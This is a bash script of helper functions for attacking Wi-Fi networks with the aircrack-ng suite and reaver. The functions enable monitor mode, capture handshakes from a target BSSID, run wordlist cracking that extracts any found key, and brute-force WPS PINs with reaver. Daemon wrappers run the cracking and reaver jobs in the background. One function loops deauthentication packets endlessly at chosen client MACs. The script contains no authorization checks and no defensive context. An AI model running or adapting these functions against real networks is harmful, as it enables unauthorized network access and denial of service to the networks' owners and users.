#!/bin/bash

CAVAN_WIFI_PATH="${HOME}/cavan-wifi"

function cavan-wifi-mon-start()
{
	sudo airmon-ng start $1
}

function cavan-wifi-mon-stop()
{
	sudo airmon-ng stop $1
}

function cavan-wifi-mon-scan()
{
	clear
	sudo airodump-ng $1
}

function cavan-wifi-mon-capture()
{
	local pathname="${CAVAN_WIFI_PATH}/${2//:}"

	echo "bssid = $2"
	echo "channel = $3"
	echo "interface = $1"
	echo "pathname = ${pathname}"

	echo "Press enter to start"
	read

	sudo mkdir -pv "${CAVAN_WIFI_PATH}"

	clear
	sudo airodump-ng -c $3 -w "${pathname}" --bssid $2 $1
}

function cavan-wifi-mon-crack-file()
{
	local words="$1"
	shift

	date
	ls -lh "${words}"

	for fn in $*
	do
		local key=$(aircrack-ng -w "${words}" "${fn}" | grep "KEY FOUND!" | sed 's/^.*\[ \(.*\) \].*$/\1/g' | uniq)
		[ -n "${key}" ] &&
		{
			echo "key = $key, data = $fn"
			return 0
		}
	done

	return 1
}

function cavan-wifi-mon-crack()
{
	local words="$1"
	shift

	echo "words = ${words}"
	echo "datas = $*"

	if [ -d "${words}" ]
	then
		for fn in $(find "${words}" -type f -iname "*.txt")
		do
			cavan-wifi-mon-crack-file "$fn" $* && break
		done
	else
		cavan-wifi-mon-crack-file "${words}" $*
	fi
}

function cavan-wifi-mon-crack-daemon()
{
	local pathname="${CAVAN_WIFI_PATH}/crack-$(basename $2).log"

	echo "pathname = $pathname"

	mkdir -pv "${CAVAN_WIFI_PATH}"
	cavan-service --start -l "$pathname" --exec "source ${CAVAN_HOME}/script/app/wifi.sh && cavan-wifi-mon-crack $*"
}

function cavan-wifi-mon-deauth()
{
	local interface="$1"
	local ap="$2"

	echo "interface = ${interface}"
	echo "ap = ${ap}"

	shift 2

	while :;
	do
		for mac in $*
		do
			echo "Try mac: ${mac}"
			sudo aireplay-ng --ignore-negative-one -0 2 -a ${ap} -c ${mac} ${interface}
		done

		sleep 2
	done
}

function cavan-wifi-minidwep-gtk()
{
	sudo bash /usr/local/bin/minileafdwep/minidwep-gtk.sh
}

function cavan-wifi-reaver()
{
	local pathname="${CAVAN_WIFI_PATH}/reaver-${2//:}.wps"
	local args="-i $1 -b $2 -s ${pathname} -a -l 1 -vv -S"

	[ "$3" ] && args="$args -c $3"
	[ "$4" ] && args="$args -p $4"
	[ "$5" ] && args="$args -d $5"

	echo "args = $args"

	mkdir -pv "${CAVAN_WIFI_PATH}"
	reaver $args
}

function cavan-wifi-reaver-daemon()
{
	local pathname="${CAVAN_WIFI_PATH}/reaver-${2//:}.log"

	echo "pathname = $pathname"

	mkdir -pv "${CAVAN_WIFI_PATH}"
	cavan-service --start -l "$pathname" --exec "source ${CAVAN_HOME}/script/app/wifi.sh && cavan-wifi-reaver $*"
}
